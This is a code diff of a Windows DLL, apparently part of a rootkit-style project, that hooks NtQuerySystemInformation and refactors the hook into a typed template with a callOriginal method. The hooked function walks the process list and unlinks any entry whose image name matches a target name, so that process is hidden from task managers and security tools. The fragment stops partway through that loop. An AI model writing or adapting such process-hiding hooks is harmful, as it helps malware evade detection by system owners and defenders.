@@ -1,4 +1,3 @@
-// dllmain.cpp : Defines the entry point for the DLL application.
 #include "pch.h"
 #include <winternl.h>
 #include "winNt.h"
@@ -16,8 +15,7 @@ NtQuerySystemInformationHook(
 );
 
 UNICODE_STRING hiddenImageName;
-Hook ntQuerySystemInformationHook = Hook((void*)_NtQuerySystemInformation, (void*)NtQuerySystemInformationHook);
-wil::unique_mutex mutex(CreateMutex(NULL, FALSE, NULL));
+Hook<decltype(&NtQuerySystemInformation)> ntQuerySystemInformationHook(_NtQuerySystemInformation, NtQuerySystemInformationHook);
 
 __kernel_entry NTSTATUS
 NTAPI
@@ -27,18 +25,14 @@ NtQuerySystemInformationHook(
 	IN ULONG SystemInformationLength,
 	OUT PULONG ReturnLength OPTIONAL
 ) {
-	WaitForSingleObject(mutex.get(), INFINITE);
-	ntQuerySystemInformationHook.revert();
-	auto retval = _NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
-	ntQuerySystemInformationHook.apply();
-	ReleaseMutex(mutex.get());
+	auto retval = ntQuerySystemInformationHook.callOriginal(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 
 	if (SystemInformationClass != SystemProcessInformation)
 		return retval;
 	auto processInfo = static_cast<SYSTEM_PROCESS_INFORMATION*>(SystemInformation),
 		prevGoodProcessInfo = processInfo; // Ok since we know the first process is "System Interrupts"
 
-	while (TRUE) {
+	while (true) {
 		if (_RtlEqualUnicodeString(&processInfo->ImageName, &hiddenImageName, FALSE)) {
 			prevGoodProcessInfo->NextEntryOffset += processInfo->NextEntryOffset;
 			if (0 == processInfo->NextEntryOffset)
